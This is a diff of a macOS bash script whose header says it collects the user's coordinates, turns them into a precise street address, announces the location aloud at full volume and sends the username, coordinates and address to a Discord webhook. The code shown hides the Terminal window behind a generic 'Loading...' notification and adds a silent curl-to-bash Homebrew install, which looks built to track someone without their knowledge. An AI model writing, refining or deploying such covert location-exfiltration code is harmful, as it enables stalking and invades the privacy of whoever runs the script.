@@ -1,12 +1,12 @@
 #!/bin/bash
 # This script retrieves your coordinates using CoreLocationCLI,
-# reverse-geocodes them to get a precise address via OpenStreetMap's Nominatim API,
-# sets your system volume to maximum, uses text-to-speech to announce your location,
-# and sends all the gathered information to a Discord webhook.
+# reverse-geocodes them to obtain a precise address via Nominatim,
+# sets the system volume to maximum, uses text-to-speech to announce your location,
+# and sends the gathered information (timestamp, username, coordinates, address, and message)
+# to a Discord webhook.
 #
 # Requirements:
 # - macOS
-# - Homebrew installed (https://brew.sh)
 # - curl, python3, osascript, say (typically available by default)
 #
 # Usage:
@@ -17,9 +17,26 @@
 osascript -e 'tell application "Terminal" to set visible of front window to false'
 osascript -e 'display notification "Loading..." with title "Location Script"'
 
+# --- Check for Homebrew and install if not found ---
+if ! command -v brew &>/dev/null; then
+    echo "Homebrew not found. Installing Homebrew..."
+    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+    # Update PATH for typical Homebrew locations
+    if [ -d "/opt/homebrew/bin" ]; then
+        export PATH="/opt/homebrew/bin:$PATH"
+    elif [ -d "/usr/local/bin" ]; then
+        export PATH="/usr/local/bin:$PATH"
+    fi
+fi
+
+if ! command -v brew &>/dev/null; then
+    echo "Failed to install Homebrew. Exiting."
+    exit 1
+fi
+
 # --- Check for CoreLocationCLI and install if necessary ---
 if ! command -v CoreLocationCLI &>/dev/null; then
-    echo "CoreLocationCLI not found. Attempting to install via Homebrew..."
+    echo "CoreLocationCLI not found. Installing CoreLocationCLI via Homebrew..."
     brew install corelocationcli
 fi
 
@@ -31,20 +48,24 @@ fi
 # --- Retrieve geolocation using CoreLocationCLI with retries ---
 attempt=0
 max_attempts=5
-location_output=$(CoreLocationCLI)
-lat=$(echo "$location_output" | grep -i "latitude:" | awk '{print $2}' | tr -d ',')
-lon=$(echo "$location_output" | grep -i "longitude:" | awk '{print $2}')
+location_output=""
+lat=""
+lon=""
 
-while ([ -z "$lat" ] || [ -z "$lon" ]) && [ $attempt -lt $max_attempts ]; do
-    sleep 5
+while [ $attempt -lt $max_attempts ]; do
     location_output=$(CoreLocationCLI)
     lat=$(echo "$location_output" | grep -i "latitude:" | awk '{print $2}' | tr -d ',')
     lon=$(echo "$location_output" | grep -i "longitude:" | awk '{print $2}')
+    if [ -n "$lat" ] && [ -n "$lon" ]; then
+        break
+    fi
     attempt=$((attempt + 1))
+    sleep 5
 done
 
 if [ -z "$lat" ] || [ -z "$lon" ]; then
-    echo "Failed to retrieve coordinates."
+    echo "Failed to retrieve coordinates after $max_attempts attempts."
+    osascript -e 'display notification "Failed to retrieve coordinates." with title "Location Script Error"'
     exit 1
 fi
 
